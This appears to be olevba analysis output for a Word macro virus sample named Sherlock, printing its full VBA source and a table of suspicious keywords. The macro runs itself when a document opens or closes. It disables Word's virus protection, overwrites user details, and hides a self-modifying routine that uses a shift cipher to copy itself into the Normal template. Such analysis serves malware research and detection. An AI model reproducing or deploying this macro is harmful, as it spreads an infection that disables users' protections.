olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sherlock-7dbf0012b388aebd0099a76d4704fb74c97658bd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sherlock-7dbf0012b388aebd0099a76d4704fb74c97658bd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const BOK = "Microsoft Word"
'Unread
Private Sub document_open()
  Set ad = ActiveDocument.VBProject.VBComponents(1).CodeModule
  Set nt = NormalTemplate.VBProject.VBComponents(1).CodeModule
  Set Thi = ThisDocument.VBProject.VBComponents(1).CodeModule
  ADi = ad.Find(BOK, 1, 1, 100, 100)
  NTi = nt.Find(BOK, 1, 1, 100, 100)
 
  If (ADi = True And NTi = True) Then
    GoTo finish
  End If
  If Thi.lines(2, 1) = "'Unread" Then
    Call dekrip
  ElseIf Thi.lines(2, 1) = "'Read" Then
    GoTo finish
  End If
Application.Caption = "Rio&Umi 4ever together"


finish:
End Sub


Private Sub document_close()
On Error GoTo finish
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Application.UserName = "Rio&Umi 4ever together"
  Application.UserAddress = "rio96@student.te.ugm.ac.id"
  Application.UserInitials = "Rio"
  Set ad = ActiveDocument.VBProject.VBComponents(1).CodeModule
  Set nt = NormalTemplate.VBProject.VBComponents(1).CodeModule
  Set Thi = ThisDocument.VBProject.VBComponents(1).CodeModule
  ADi = ad.Find(BOK, 1, 1, 100, 100)
  NTi = nt.Find(BOK, 1, 1, 100, 100)
  
  If (ADi = True And NTi = True) Then
    GoTo finish
  End If
  If Thi.lines(2, 1) = "'Read" Then
    Call enkrip
  ElseIf Thi.lines(2, 1) = "'Unread" Then
    GoTo finish
  End If
',,
',,Ur,4MPu,I,`~�q,Mzp,Z`u,I,Rmxq5,`tqz
',,,,_MbU`,I,Z{~ymx`qy|xm€q:_m‚qp
',,,,z€:pqxq€qxuzq,=8,z€:O{�z€{rxuzq
',,,,o{ppq,I,`tu:xuzq4=8,`tu:O{�z€{rxuzq5
',,,,z€:mppr~{y€~uzs,o{ppq
',,,,^qy,Ur,m‚u€,`tqz,Z{~ymx`qy|xm€q:_m‚q
',,QxqUr,4MPu,I,Rmxq,Mzp,Z`u,I,`~�q5,`tqz
',,,,_MbU`,I,Mo€u‚qP{o�yqz€:_m‚qp
',,,,mp:pqxq€qxuzq,=8,mp:O{�z€{rxuzq
',,,,o{ppq,I,`tu:xuzq4=8,`tu:O{�z€{rxuzq5
',,,,,mp:mppr~{y€~uzs,o{ppq
',,,,Ur,_MbU`,`tqz,Mo€u‚qP{o�yqz€:_m‚q
',,Qzp,Ur
  
ActiveDocument.Save
finish:
ActiveDocument.Save

End Sub

Private Sub enkrip()
Dim test1 As String
   
    'JumLine = ThisDocument.VBProject.VBComponents(1).CodeModule.Countoflines
    For i = 46 To 59
        test1 = "'"
        Line = ThisDocument.VBProject.VBComponents(1).CodeModule.lines(i, 1)
        panbar = Len(Line)
        For t = 1 To panbar
            Kar = Mid$(Line, t, 1)
            test1 = test1 + (Chr(Asc(Kar) + 12))
        Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine i, test1
    test1 = "'"
    Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 2, "'Unread"
End Sub

Private Sub dekrip()
Dim test1 As String
    
    'JumLine = ActiveDocument.VBProject.VBComponents(1).CodeModule.Countoflines
    For i = 46 To 59
        test1 = ""
        Line = ThisDocument.VBProject.VBComponents(1).CodeModule.lines(i, 1)
        panbar = Len(Line)
        For t = 2 To panbar
            Kar = Mid$(Line, t, 1)
            test1 = test1 + (Chr(Asc(Kar) - 12))
        Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine i, test1
    test1 = ""
    Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 2, "'Read"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

